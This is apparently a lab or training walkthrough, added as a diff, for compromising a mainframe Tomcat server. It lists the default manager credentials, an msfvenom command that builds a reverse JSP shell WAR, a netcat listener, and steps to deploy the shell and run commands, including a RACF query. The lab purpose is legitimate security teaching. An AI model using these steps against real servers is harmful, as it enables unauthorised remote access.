@@ -1,0 +1,19 @@
+Assuming we used nikto we noted that the Tomcat server is running with default creds:
+ - Port: 8080
+ - Username: tomcat
+ - Password: s3cret
+WARNING: Please do not brute force this account as it will automatically lock everyone out.
+
+Get a reverse shell:
+- using metasploit generate a reverse JSP shell:
+- msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell_<userid>.war
+- Listen with netcat: nc -lvp <LPORT>
+- Using the Tomcat interface at /manager to deploy your shell
+  - Scroll down to 'WAR file to deploy'
+  - Click 'browse'
+  - Select the 'war' file from the output of msfvenom
+  - Click 'Deploy'
+  - Once done uploading click on your application in the 'Applications' section (scroll up) or browse to: <mainframe ip>:8080/shell_<userid>
+- Give it a while (yay java) eventually you will get a connection in to netcat, issue some unix commands like pwd, id, who, ps, etc
+
+BONUS: What ATTRIBUTES does this account have? (you need to issue the racf command LU to see this)
